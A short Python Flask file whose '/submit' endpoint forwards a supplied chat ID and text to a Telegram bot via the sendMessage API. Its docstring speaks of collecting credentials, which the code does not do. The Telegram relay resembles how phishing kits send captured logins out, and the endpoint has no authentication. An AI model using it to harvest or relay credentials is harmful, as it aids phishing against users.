import os
import requests
from flask import request, jsonify
from app import app

@app.route("/submit", methods=["POST"])
def submit_data():
    """ Show content page and collect credentials """
    try:
        # Get JSON data from the POST request
        data = request.get_json()

        # If the data is not in JSON format
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        # Get chat ID and update
        chat_id = data.get('chat_id')
        update = data.get('update')

        if not chat_id:
            return jsonify({"error": "Missing required chat_id"}), 400

        if not update:
            return jsonify({"error": "Missing required update"}), 400

        # Get bot access token from environment variables
        access_token = os.getenv('BOT_ACCESS_TOKEN')
        method_name = 'sendMessage'

        message = {
            'chat_id': chat_id,
            'text': update
        }

        # Send message on telegram
        url = f'https://api.telegram.org/bot{access_token}/{method_name}'
        response = requests.post(url, json=message, timeout=10)

        # Check if the response was successful
        if response.status_code == 200:
            # If successful, extract the JSON response and return it
            return jsonify(response.json()), 200

        # If not successful, return the error message from Telegram API
        return jsonify({"error": "Failed to send message", "details": response.json()}), response.status_code

    except Exception as e:
        return jsonify({"error": str(e)}), 500
